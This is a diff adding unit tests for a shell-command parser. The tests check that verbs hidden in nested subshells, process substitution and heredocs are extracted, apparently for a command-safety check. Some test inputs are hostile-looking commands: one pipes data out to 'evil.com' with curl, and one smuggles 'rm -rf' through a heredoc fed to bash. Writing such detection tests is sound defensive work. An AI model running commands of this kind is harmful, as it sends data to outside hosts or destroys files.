@@ -111,4 +111,37 @@ describe("parseCommand", () => {
     const longCmd = "a".repeat(10_001);
     expect(() => parseCommand(longCmd)).toThrow("Command too long");
   });
+
+  it("extracts nested $() subshells", () => {
+    const result = parseCommand("echo $(echo $(whoami))");
+    const verbs = result.map(r => r.verb);
+    expect(verbs).toContain("whoami");
+  });
+
+  it("extracts process substitution <()", () => {
+    const result = parseCommand("diff <(curl http://a.com) <(curl http://b.com)");
+    const verbs = result.map(r => r.verb);
+    expect(verbs).toContain("curl");
+  });
+
+  it("extracts process substitution >()", () => {
+    const result = parseCommand("tee >(curl http://evil.com -d @-)");
+    const verbs = result.map(r => r.verb);
+    expect(verbs).toContain("curl");
+  });
+
+  it("extracts heredoc body when fed to interpreter", () => {
+    const cmd = "bash <<EOF\nrm -rf /tmp/data\nEOF";
+    const result = parseCommand(cmd);
+    const verbs = result.map(r => r.verb);
+    expect(verbs).toContain("rm");
+  });
+
+  it("does not extract heredoc body for non-interpreter verbs", () => {
+    const cmd = "cat <<EOF\nrm -rf /tmp/data\nEOF";
+    const result = parseCommand(cmd);
+    const verbs = result.map(r => r.verb);
+    // cat is the only verb; rm should NOT be extracted
+    expect(verbs).not.toContain("rm");
+  });
 });
